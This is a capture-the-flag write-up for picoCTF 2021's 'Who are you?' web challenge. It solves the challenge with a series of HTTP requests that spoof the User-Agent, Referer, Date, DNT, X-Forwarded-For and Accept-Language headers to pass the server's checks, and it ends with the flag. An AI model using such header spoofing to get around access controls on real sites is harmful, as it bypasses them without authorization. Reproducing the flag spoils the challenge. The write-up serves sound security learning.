# Who are you?
Description: Let me in. Let me iiiiiiinnnnnnnnnnnnnnnnnnnn

Category: Web Exploitation, 100 points

Original Event: picoCTF 2021

## Solution
When opening the site, we are greeted with the message: "Only people who use the official PicoBrowser are allowed on this site!", and a gif of the kazoo kid (throwback!). My first thought was to edit the UserAgent field of the http request in order to appear to be using the "PicoBrowser". 
I used BurpSuite to re-forward the original connection request, this time with the UserAgent changed to "PicoBrowser":
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:39114
Cache-Control: max-age=1
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```
This worked, and the page changed, this time displaying the message: "I don't trust users visiting from another site.". This seriously stumped me as I looked in my existing HTTP request for any sort of referral field, and then decided to consult the holy grail, [Mozilla's http headers list](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers). Here I found exactly what I was looking for, the ["Referer"](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) header.

Putting this into the request and setting the value to be the host, the site changed again.
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:39114
Cache-Control: max-age=1
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Referer: mercury.picoctf.net:39114
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```
This time, the site states: "Sorry, this site only worked in 2018." 
Adding the "Date" header to our request with a value of 2018 allows us to proceed, now displaying "I don't trust users who can be tracked."
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:39114
Date: 2018
Cache-Control: max-age=1
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Referer: mercury.picoctf.net:39114
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```
This pointed me towards the now deprecated "DNT" header, which tells the server whether or not to track the user. 
Adding the DNT header and setting it to 1 now shows the message: "This website is only for people from Sweden."
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:39114
Date: 2018
DNT: 1
Cache-Control: max-age=1
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Referer: mercury.picoctf.net:39114
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```
This one was trickier, as I had to find a Swedish IP address to use with the ["X-Forwarded-For"](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) header.
After looking around, I found a ["site"](https://db-ip.com/all/199.247.35) with a large list of Google-owned IP addresses originating in Sweden. Choosing one of these and adding it to my request yielded the message: "You're in Sweden but you don't speak Swedish?"
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:39114
Date: 2018
DNT: 1
X-Forwarded-For: 199.247.35.2
Cache-Control: max-age=1
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Referer: mercury.picoctf.net:39114
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```
After adding Swedish (sv) to the Accept-Language header, we are finally greeted with the flag.
```http
GET / HTTP/1.1
Host: mercury.picoctf.net:39114
Date: 2018
DNT: 1
X-Forwarded-For: 199.247.35.2
Cache-Control: max-age=1
Upgrade-Insecure-Requests: 1
User-Agent: PicoBrowser
Referer: mercury.picoctf.net:39114
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,sv,en;q=0.9
```

### Flag:picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_20ace0e4}
